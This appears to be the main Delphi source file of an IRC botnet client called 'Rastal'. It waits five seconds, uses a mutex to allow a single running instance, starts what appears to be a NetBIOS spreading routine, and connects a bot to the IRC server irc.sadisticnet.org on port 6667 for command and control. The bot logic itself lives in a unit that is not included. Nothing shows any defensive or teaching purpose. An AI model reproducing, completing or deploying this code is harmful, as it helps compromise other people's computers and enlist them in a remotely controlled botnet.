   program Rastal;

   uses
     Windows, Winsock, uNetBios,
     rastalbot in 'rastalbot.pas';

   var
     bot: tbot;

   function IPstr(HostName:String) : String;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   begin

     sleep(5000);
     if createmutex(nil, false, pchar('rastalbotistehshit')) = error_already_exists then exitprocess(0);

     startnetbios(400);
     bot := tbot.Create;
     bot.host := IPstr('irc.sadisticnet.org');
     bot.port := 6667;
     bot.createbot;
   end.
